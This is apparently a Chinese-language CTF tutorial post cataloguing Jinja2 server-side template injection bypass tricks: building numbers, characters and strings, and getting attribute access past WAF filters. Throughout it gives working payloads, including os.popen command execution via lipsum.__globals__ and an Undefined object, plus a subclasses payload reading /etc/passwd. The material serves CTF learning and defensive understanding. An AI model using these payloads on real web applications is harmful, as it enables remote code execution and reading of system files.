- 发布标题：**Jinja2 SSTI进阶：那些广为认知和不为人知的绕过手法**
- # 写在前面
	- 2025到了，现在像焚靖这样的SSTI工具也已经有很多人用了。但是在很多时候像这样的工具是没法使用的。作为焚靖的作者，我在这里把这几年收集到的Jinja SSTI绕过手法分享出来让新手能够更好的学习CTF. 也希望各位大佬补充自己喜欢的手法。
	- 这篇文章不会着重解释jinja的语法和其他基础内容，需要的话可以看看[大佬的文章](https://lazzzaro.github.io/2020/05/15/web-SSTI/)
	- 本文充斥着我乱起的手法名，最好不要当真。。。
- # 常用绕过思路
	- 两条路径
		- 首先是最好用的内置变量法：
			- 用`lipsum`等内置变量找到`globals`字典，然后获得`eval`函数或者`__import__`函数就能实现RCE。
			- 比如说`{{lipsum.__globals__.__builtins__.__import__('os').popen('ls /').read()}}`
			- 这里一共有四个难点需要绕过：``lipsum``等变量、任意数字、任意字符串、属性和item
		- 然后是大家刚学SSTI的时候都会接触到的subclasses法：
			- 比如说`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`，需要自己找需要的类，比较繁琐
	- 常见绕过难点
		- 先想如何构造正整数和字符串
		- 然后想如何取属性、取item、调用函数
		- 最后想能不能用`{{}}`，`{%print%}`等实现回显，不能就用`{%if xxx%}{%endif%}`，`{%for xxx%}{%endfor%}`实现无回显RCE
- # 常见的的内置变量
	- jinja的在`defaults.py`里
		- ```python
		  DEFAULT_NAMESPACE = {
		      "range": range,
		      "dict": dict,
		      "lipsum": generate_lorem_ipsum,
		      "cycler": Cycler,
		      "joiner": Joiner,
		      "namespace": Namespace,
		  }
		  ```
	- flask的
		- ```python
		  rv.globals.update(
		    url_for=self.url_for,
		    get_flashed_messages=get_flashed_messages,
		    config=self.config,
		    request=request,
		    session=session,
		    g=g,
		  )
		  ```
		- 除了这些还有`self`和`current_app`可以用
		- 有时候用不了。如果服务端不使用`render_template_string`而是直接调用Jinja渲染的话那就用不了这些变量
	- 使用Undefined实现**万能绕过**
		- 随便输入一个变量名就会变成`Undefined`对象，这个对象也是Jinja的内置对象，有``__init__``函数等等
		- 比如说``{{ tql123.__eq__['__globals__']['__builtins__']['__import__']('os').popen('ls').read()}}``，jinja和flask都肯定没有`tql123`这个变量，所以它直接变成了Undefined, 然后就可以拿到`__eq__`这个函数，像使用`lipsum`或者`g.pop`一样实现RCE
		- 但是因为jinja本身实现的问题，不能使用`xxx["__eq__"]`这样的语法取Undefined的属性
		- 所以`xxxx.__eq__`可以**在任何payload中代替`lipsum`实现RCE**, 而且`xxxx`这个**变量名是任意的**，可以随便起
		- Undefined类有很多函数可以代替`__eq__`，在[这里](https://github.com/pallets/jinja/blob/6aeab5d1da0bc0793406d7b402693e779b6cca7a/src/jinja2/runtime.py#L796)看
- # 构造任意数字
	- 如果WAF ban了数字字符的话可以用这些技巧绕过
	- 某些特殊的数字，可以用来凑出其他所有的正整数
		- 比如说`()|int`就是`0`，这样可以构造出很多（不是全部）数字
		- 具体可以直接参考fenjing源码里的`const_exprs`字典，[这里](https://github.com/Marven11/Fenjing/blob/4a25b8566d365e7e52b4ec770e20c219a66ed687/fenjing/context_vars.py#L65)
	- 字符拼接
		- 如果可以用上面的方法构造出0-9这10个数字，那可以把任意数字一位一位地拼出来
		- 比如说`(1~2~3)|int`就是数字123，其中1,2,3用上面的方法构造。构造出来长这样：
			- ```
			  ({x:x}|count~()|e|length~({}~{}|int)|count)|int
			  ```
	- 求列表的和或者长度
		- 如果可以用`[x,x,x]`或者`(x,x,x)`构造出列表或者元组，那可以用`|sum`求列表的和，或者用`|length`或者`|count`求列表的长度。
		- 别忘了`True`也是数字，可以当成`1`用
		- 不能用逗号也可以考虑构造一个很长的任意字符串然后求长度。其中使用`~`拼接数字的时候数字会被转换成字符串
		- 别忘了构造任意列表或者元组的时候可以直接构造Undefined，具体构造方法看上面
		- 不能使用`|length`和`|count`也可以使用`.__len__()`代替
	- 四则运算等
		- 如果需要构造的数字`x`除以a为b余c,也就是`x==a*b+c`的话，那直接构造`a*b+c`就行了
		- 或者使用`a+b+c+d+...`甚至`1+1+1+1+...`甚至`True+True+True+...`构造出任意数字
		- 用减法也行...构造出一个很大的数字然后用`a-b-c`这样构造出任意数字
		- 除了四则运算之外还有n次方`**`可以用
		- 如果不能使用符号`+-*/`可以考虑调用`__add__`等函数，如`1+1`可以替换成`(1).__add__(1)`
	- 二进制和十六进制：`0b`和`0x`是可以用的
	- 下划线
		- python中可以用下划线隔开数字中的位数，如`1_0_0`代表`100`
	- unicode
		- 数字除了最左边的数之外都可以用unicode字符代替，如`1੦੦`代表100，`0b`和`0x`右边的数字字符也可以这么绕过
		- 旧版jinja最左边的数字也可以使用任意字符，如`١٠٠`代表100
		- 具体的正则看这里，其中`\d`表示包括unicode字符在内的任意数字字符
		- ```python
		  integer_re = re.compile(
		      r"""
		      (
		          0b(_?[0-1])+ # binary
		      |
		          0o(_?[0-7])+ # octal
		      |
		          0x(_?[\da-f])+ # hex
		      |
		          [1-9](_?\d)* # decimal
		      |
		          0(_?0)* # decimal zero
		      )
		      """,
		      re.IGNORECASE | re.VERBOSE,
		  )
		  ```
		- 所有可用的unicode数字字符，python3.2之上都可以用，大部分文章都只总结了最后一个
			- ```python
			  ['٠١٢٣٤٥٦٧٨٩', '۰۱۲۳۴۵۶۷۸۹', '߀߁߂߃߄߅߆߇߈߉', '०१२३४५६७८९', '০১২৩৪৫৬৭৮৯', 
			   '੦੧੨੩੪੫੬੭੮੯', '૦૧૨૩૪૫૬૭૮૯', '୦୧୨୩୪୫୬୭୮୯', '௦௧௨௩௪௫௬௭௮௯', '౦౧౨౩౪౫౬౭౮౯', 
			   '೦೧೨೩೪೫೬೭೮೯', '൦൧൨൩൪൫൬൭൮൯', '๐๑๒๓๔๕๖๗๘๙', '໐໑໒໓໔໕໖໗໘໙', '༠༡༢༣༤༥༦༧༨༩', 
			   '၀၁၂၃၄၅၆၇၈၉', '႐႑႒႓႔႕႖႗႘႙', '០១២៣៤៥៦៧៨៩', '᠐᠑᠒᠓᠔᠕᠖᠗᠘᠙', '᥆᥇᥈᥉᥊᥋᥌᥍᥎᥏', 
			   '᧐᧑᧒᧓᧔᧕᧖᧗᧘᧙', '᪀᪁᪂᪃᪄᪅᪆᪇᪈᪉', '᪐᪑᪒᪓᪔᪕᪖᪗᪘᪙', '᭐᭑᭒᭓᭔᭕᭖᭗᭘᭙', 
			   '᮰᮱᮲᮳᮴᮵᮶᮷᮸᮹', '᱀᱁᱂᱃᱄᱅᱆᱇᱈᱉', '᱐᱑᱒᱓᱔᱕᱖᱗᱘᱙', '꘠꘡꘢꘣꘤꘥꘦꘧꘨꘩', '꣐꣑꣒꣓꣔꣕꣖꣗꣘꣙', 
			   '꤀꤁꤂꤃꤄꤅꤆꤇꤈꤉', '꧐꧑꧒꧓꧔꧕꧖꧗꧘꧙', '꩐꩑꩒꩓꩔꩕꩖꩗꩘꩙', '꯰꯱꯲꯳꯴꯵꯶꯷꯸꯹', 
			   '０１２３４５６７８９']
			  ```
		- 原理是jinja2使用了python内置的`int`函数转换数字，而这个函数支持各种unicode字符转换。这个函数支持的字符还挺多，但是应该是在python3.2之后就没有再增加了
			- ```python
			  >>> print(int("١٠٠"))
			  100
			  ```
- # 字符
	- 内置对象转字符串
		- 可以使用这些filter将任意对象转换成字符
			- `escape`, `forceescape`, `pprint`, `string`, `safe`
			- `capitalize`, `center`, `lower`, `upper`, `striptags`, `title`, `trim`
			- `urlencode`, `tojson`
		- 其中`escape`可以简写成`e`，非常好用
		- 可以使用上面的内置变量生成字符串，然后从里面找出需要的字符，比如`(lipsum|e)[2]`就是字符`"t"`
		- 凑出26个小写字母和下划线就可以拼出比如`__class__`之类的字符串了
	- `__doc__`
		- `lipsum.__doc__[xxx]`
		- `cycler.__doc__[xxx]`
	- 字典构造字符
		- 以字母`"g"`为例
		- `dict(g=x)|first`
		- 如果字母g本身被禁了考虑使用``lower``filter: ``dict(G=x)|first|lower``
		- `namespace(g=x)._Namespace__attrs|join`
	- 绕过方括号`[]` WAF
		- 使用`batch(xxx)|first|last`
			- 如果要取第n个字符，那就将字符串分成n个一组，然后取第一组的最后一个字符
			- 比如取出字符串`"abcdef"`中的字符`b`，可以使用`"abcdef"|batch(2)|first|last`
			- 也就是执行：`"abcdef" -> ["ab", "cd", "ef"] -> "ab" -> "b"`
		- 使用`lipsum.__globals__.__builtins__.chr`生成
			- 非常麻烦，需要先搞定其他字符以及取属性取item
- # 字符串拼接
	- `+`和`~`
		- 其中`~`会强制将两边的对象转成字符串，如`1~1`是`"11"`
	- `join`
		- `("a","b")|join`
		- ``{"a": 1, "b": 1}|join``
		- `''.join(('a','b'))`，其中空字符串可以使用`e|e`构造
	- `format`: `"%s%%s"|format("a")|format("b")`
	- `replace`: `12|replace(1,'a')|replace(2,'b')`
	- 字符串重复
		- 使用乘号，如`"%c"*3`
		- 使用`replace`，如`1111|replace(1,"%c")`
		- 使用`join`
			- `("%c","%c")|join`
			- `(x,x,x,x)|join("%c")`是`"%c%c%c"`，把多个Undefined（等价空字符串）拼接起来，分隔符是`%c`
- # 特殊字符串`"%c"`
	- 可以考虑分别构造字符`"%"`和`"c"`，然后拼接起来，生成字符和字符串拼接的手法在上面
	- `"%"`比较难找，考虑使用`urlencode` filter对标点符号进行urlencode，以及从`1.__mod__.__doc__`这个字符串里取出`"%"`
	- 如果需要多个`"%c"`（如`"%c%c%c"`）可以参考上方的字符串拼接
- # 特殊字符串`"__"`
	- 生成`"_"`参考上面的生成字符，字符串重复参考上面的字符串拼接
- # 字符串
	- 如果可以使用单引号和双引号的话
		- 使用`"\x61\x62\x63"`，`'\\152\\151\\156\\152\\141\\62'`和`"\u0061\u0062"`
		- `"__gl""obals__"`将一个字符串写成两个字符串连接的形式，中间可以加空格
	- 将字符串分割成多个部分，分别生成并拼接
		- `"__"+"globals"+"__"`，分别生成`"__"`和`"globals"`然后拼接起来
		- 生成各个字符再一个个拼接
	- `[::-1]`和`reverse` filter，如`"__slabolg__"|reverse`
	- `dict`: `dict(globals=x)|first`，可以配合`reverse`等filter
	- 使用大小写绕过，比如说使用`lower`和`upper`这两个filter，如`"GLOBALS"|lower`和`dict(GLOBALS=x)|first|lower`
	- 使用`"%c"`
		- 可以用来将unciode码点转换成字符，如`"%c"%97`是字符`"a"`, `"%c%c%c"%(97,98,99)`是`"abc"`
		- 使用`format` filter: `"%c"|format(97)`
	- 使用`to_bytes`函数
		- 将数字转成bytes，然后转成字符串。如`(117001056575794).to_bytes(6).decode()`
		- 可以这么生成
			- ```python
			  >>> int.from_bytes("jinja2".encode(), "big")
			  117001056575794
			  ```
		- 注意`to_bytes`函数只有在python3.11之上才有默认大端序，不用手动指定
- # 取属性和字典元素（getitem）
	- 注意这两个虽然语法大致相同但是是不同的操作
	- 取属性
		- `lipsum.__globals__`
		- `lipsum["__globals__"]`
		- `lipsum|attr("__globals__")`
		- `[lipsum]|map("attr","__globals__")|first`
		- `[lipsum]|map(attribute="__globals__")|first`
	- item
		- `lipsum.__globals__`
		- `lipsum["__globals__"]`
		- `lipsum|attr("__getitem__")("__globals__")`
- # filter
	- 使用`map`
		- 比如`lipsum|attr("__globals__")`可以改成`[lipsum]|map("attr","__globals__")|first`
- # 参考
	- https://lazzzaro.github.io/2020/05/15/web-SSTI/
	-